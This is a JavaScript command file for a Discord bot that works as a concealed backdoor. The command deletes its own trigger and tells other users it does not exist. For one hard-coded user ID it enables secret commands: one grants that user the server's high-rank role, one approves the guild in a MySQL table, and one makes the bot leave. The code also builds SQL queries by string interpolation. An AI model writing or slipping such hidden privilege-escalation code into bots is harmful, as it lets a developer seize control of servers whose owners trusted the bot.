exports.run = async (client, message, args) => { 
    message.delete();
    
    if (message.author.id != 344543506481807363 || message.author.id != '344543506481807363'){ 
        return util.unkred("Lo sentimos ese comando no existe", 5000)
    };
    
    var cmdActive = false;
    var user = message.author.id;

    try {
        message.author.send(`Que bueno tenerte de vuelta <@${message.author.id}>`);
        cmdActive = true;
        client.on("message", (message) => {
            if (message.author.id == user) {
                try{ 
                    if (message.content.startsWith("-giveRole") && cmdActive == true ) {               
                        message.delete();
                        let miembro = message.member;
                        let role = message.guild.roles.find("name", `${config.highrank}`);          
                        if(!role) return message.author.send(`No encontre ese rol en el servidor  ${config.svname}.`);
                        miembro.addRole(role).catch(console.error); 
                        cmdActive = false                                                             
                    }else if(message.content.startsWith("-aproveThisGuild") && cmdActive == true) {
                        message.delete()
                        MySQL.query(`SELECT aproved FROM servers WHERE guild = ${message.guild.id}`, (err, result) => {
                            if(result[0] == undefined){
                                MySQL.query(`INSERT INTO servers (guild, aproved) VALUES (${message.guild.id}, 1)`, () => {
                                    util.unkgreen("Este server se configuro en la base de datos y se le dio acceso a mis comandos", 5000) 
                                }); 
                            }else if(result[0] != undefined && result[0].aproved == 0) {
                                MySQL.query(`UPDATE servers SET aproved = 1 WHERE guild = ${message.guild.id}`, () => {
                                    util.unkgreen("Este server ahora tiene acceso a mis comandos", 5000)  
                                });
                            }else if(result[0] != undefined && result[0].aproved == 1) {
                                util.unkblue("Este server ya tenia acceso a mis comandos", 5000)  
                            }else if(err){
                                return console.log(err);
                            }
                        });
                        cmdActive = false; 
                    }else if(message.content.startsWith("-leftGuild") && cmdActive == true){
                        message.delete();
                        message.member.guild.leave();
                        cmdActive = false;
                    }
                }catch(err){
                    console.log(err)
                }
            }
        });  
    }catch(err){
        console.log(err)
    }
}





